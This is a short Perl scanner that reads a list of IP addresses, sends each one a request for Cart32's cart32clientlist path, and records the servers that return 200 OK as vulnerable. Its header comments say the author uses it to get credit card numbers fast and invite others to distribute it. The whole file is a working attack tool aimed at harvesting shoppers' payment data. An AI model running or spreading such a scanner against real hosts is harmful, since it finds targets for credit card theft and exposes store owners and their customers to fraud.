#!/usr/bin/perl
#
# Cart32 Scanner
# Usage: perl cart32scan.pl <infile> <outfile>
#
# i use this to get credit card numbers fast
# works too..thanks cart32 =)
#
# coded by: unknown..i hold no credit for this scanner for it was ripped
# 
# hope you don't mind f0bic..=)
#
#
#--distribute me, my young brothers--

$SIG{'ALRM'} = sub { exit(0) };
$SIG{'CHLD'} = sub { wait };

use IO::Socket;

if ($#ARGV != 1) { 
    print "\nUsage: $0 <infile> <outfile>\n\n"; exit(0);
} else {
    $infile = $ARGV[0];
    $outfile = $ARGV[1];
}

print "\n..cart32 scanner..\n\n";

open(IN, "$infile") || die "can't open infile [ $infile ]\n";
print "scanning ip's from $infile \n";
open(OUT, ">>$outfile") || die "can't create outfile [ $outfile ]\n";
print "writing ip's to $outfile \n\n";
print "checking for vulnerable servers:\n\n";
while(<IN>) {
chomp ($line = $_);
if ($line =~ /(\S*)/) {
   if ($pid = fork) {
       sleep 5;
   } elsif (defined($pid)) {
       alarm(25);
       cart32_scan($1);
       alarm(0);
       exit(0);
   }
 }
}

sub cart32_scan {

    my($server) = @_;
    $cart = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => "80");
    if (!$cart) { exit(0); }
    print $cart "GET \/scripts\/cart32.exe/\cart32clientlist HTTP\/1.0\r\n\r\n";

while(<$cart>) {
    chomp ($verify = $_);
    if ($verify =~ /^HTTP\/1\.1\s200\sOK/i) {
	print "\t$server is vulnerable\n";
        print OUT "$server is vulnerable\n";
    } 
    -close($cart);
 }
}
print "\n";
printf "..scan completed..\n\n";
close(IN);
close(OUT);
